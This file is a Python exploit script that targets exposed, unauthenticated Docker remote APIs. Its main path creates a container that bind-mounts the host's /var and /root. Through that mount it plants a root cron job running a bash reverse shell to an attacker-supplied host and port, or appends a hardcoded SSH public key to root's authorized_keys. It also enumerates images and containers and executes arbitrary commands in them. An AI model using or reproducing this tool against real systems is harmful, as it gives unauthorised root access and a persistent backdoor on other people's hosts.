#-*- coding:utf-8 -*-
#author:L.N.@insight-labs.org


import urllib2
import urllib
import json
import sys
import getopt
from docker import Client

def http_get(url):
    response = urllib2.urlopen(url)
    return response.read()

def http_post(url, values):
    jdata = values
    #print url
    #print jdata
    send_headers = {
        'Content-Type':'application/json'
    }
    req = urllib2.Request(url, data=jdata,headers=send_headers)
    response = urllib2.urlopen(req)
    return response.read()

def isset(v):
    try :
        type(eval(v))
    except:
        return 0
    else:
        return 1

def printport(portsList, name):
    if isset("portsList['IP']") == 0:
        portsList['IP']="*"
        printport(portsList,name)
    elif isset("portsList['Type']") == 0:
        portsList['Type']="*"
        printport(portsList,name)
    elif isset("portsList['PublicPort']") == 0:
        portsList['PublicPort']="*"
        printport(portsList,name)
    elif isset("portsList['PrivatePort']") == 0:
        portsList['PrivatePort']="*"
        printport(portsList,name)
    else:
        print "[-]"+name+"[+]"+portsList['Type']+"[-]"+portsList['IP']+":"+str(portsList['PrivatePort'])+" --> "+host+":"+str(portsList['PublicPort'])

def createClient(host,port,version):
    clientApiVersion = getversion(host,port,version)
    print "[-]ClientApiVersion:"+clientApiVersion
    cli = Client(base_url='tcp://'+host+':'+port,version=clientApiVersion)
    return cli

def getversion(host,port,version):
    url = "http://"+host+":"+port+"/version"
    ret = json.loads(http_get(url))
    if version != '':
        clientApiVersion = version
    else:
        clientApiVersion = ret['ApiVersion']
    return clientApiVersion

def printContainer(host,port,version,allContainer):
    cli = createClient(host,port,version)
    if allContainer == 1:
        ret = cli.containers(all=True)
    else:
        ret = cli.containers()
    for info in ret:
        print "[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]"
        print "[-] id: "+info['Id']
        print "[-] Names: "+info['Names'][0]
        print "[-] Image: "+info['Image']
        print "[-] Status: "+info['Status']
    print "[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]"

if __name__ == "__main__":
    opts, args = getopt.getopt(sys.argv[1:], "v:kauVCcsLli:e:h:p:H:P:I:")
    key = 0
    version =''
    payload =''
    sshkey = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoecC7vmWn4s2y4T+Pc3bJ0owDYWzGIBTCWWonN4qMTCbe66hKopgtUuHC1y5H3HFQ0qsni0vFAGSoO4TLiIpvHUXbf9Wi9vR2q4oYphH9Kgsd3cVXsHUFcgybwdk5DCXpmoSJTlEoOrtWajYdyuALMy+CqpkwWDj+uTz+9/2P3T0Nh5F+U+UZOgSqIi5xQfUGJKGoFGXwvpqEL6UnGG4bbgGxVa5mJZVH0cxwKK6w7luezkcRVBEJ1SZAkjZOmZojyJbYQolItcBNBsXQ+cakjg3DeU69wrDiBdP+k2i2k3uzhJqJXfxLdxUZfjgXHwSOzDb2D5+841trASAwZAy1Gq4uwkbmwupe/qTPK2R31d5h4Jqx4N19eUjT8GkkDj+mnJTwYyOPJH/ghEvn4UfNOtohM2lZPbskvvskn82g0WzYJ5JnQaKfup1IYLTraBbJ5UdVYsCfG5ddRZF4xMab2ZDgcdqyISJxHPK9/P7w7mmgSut1nK5R1+HLSl/xDAPcoVd0H3ePqxN9ZD0BoMjY8fPxKAQR+bB5M05iDIIwUxhj2NQvCpwxxGwJXUSf13zirXRZhkZGnWrkNrzqHzpLZqoEBCEORErmFAvsI8yIBvThSylReiwhAWkdL7ONQ4dd7UgsQfY/0MMfxd8/V+041I1sIVUVBnHYUUwqE0eZ9Q== wanniba@wanniba.com'
    for op, value in opts:
        if op =="-l":
            imagesList = 1
        elif op == "-i":
            imageName = value
        elif op == "-e":
            dataExec = value
        elif op == "-h":
            host = value
        elif op =='-p':
            port = value
        elif op == '-L':
            portList = 1
        elif op == '-H':
            lhsot = value
        elif op == '-P':
            lport = value
        elif op =='-C':
            createContainer = 1
        elif op == '-v':
            version = value
        elif op == '-V':
            version = 1
        elif op == '-c':
            closeContainer = 1
        elif op == '-I':
            imageId = value
        elif op == '-a':
            allContainer = 1
        elif op == '-s':
            startContainer = 1
        elif op == '-k':
            key = 1
        elif op == '-u':
            isUbuntu = 1
            
    if isset('lhsot') and isset('lport'):
        if isset('isUbuntu'):
            payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/crontabs/root"' #chmod 600
        else:
            payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/root"'  #centos,redhat and so on
        print "[-]Paylaod: "+payload
    if sshkey !='' and key == 1:
        payload = '/bin/bash -c "echo \\\"'+sshkey+'\\\" >> /tmp1/.ssh/authorized_keys"'
        print "[-]Paylaod: "+payload
    if isset('host') and isset('port'):
        if isset('version') and version == 1:
            url = "http://"+host+":"+port+"/version"
            ret = json.loads(http_get(url))
            print "[-] ApiVersion: "+ret['ApiVersion']
        elif isset('imagesList'):
            url = "http://"+host+":"+port+"/images/json"
            ret = json.loads(http_get(url))
            for info in ret:
                print "RepoTags: "+info['RepoTags'][0]
        elif isset('createContainer') and isset('imageName'):
            cli = createClient(host,port,version)
            container = cli.create_container(image=imageName, command='/bin/bash', tty=True, volumes=['/tmp','/tmp1'], host_config=cli.create_host_config(binds=['/var:/tmp:rw','/root:/tmp1:rw']))
            print "[-]Container ID:"+container['Id']
            print "[-]Warning:"+str(container['Warnings'])
            response = cli.start(container=container.get('Id'))
            if isset('isUbuntu'):
                cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd=payload))
                print "[-]create crontabs ......"
                cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd='chmod 600 /tmp/spool/cron/crontabs/root'))
                print "[-]chmod 600 ......"
            else:
                print cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd=payload))
                print "[-]create crontabs ......"
        elif isset('closeContainer') and isset('imageId'):
            cli = createClient(host,port,version)
            cli.stop(container=imageId)
            cli.remove_container(container=imageId)
        elif isset('startContainer') and isset('imageId'):
            cli = createClient(host,port,version)
            cli.start(container=imageId)
        elif isset('dataExec') and isset('imageId'):
            cli = createClient(host,port,version)
            print "[-]Command:"+dataExec
            print cli.exec_start(exec_id=cli.exec_create(container=imageId, cmd=dataExec))
        elif isset('portList'):
            url = "http://"+host+":"+port+"/containers/json"
            ret = json.loads(http_get(url))
            for pl in ret:
                if isset("pl['Names'][0]"):
                    name = pl['Names'][0]
                else:
                    name = '*'
                for portsList in pl['Ports']:
                    printport(portsList, name)
        else:
            if isset('allContainer'):
                printContainer(host,port,version,allContainer)
            else:
                printContainer(host,port,version,0)
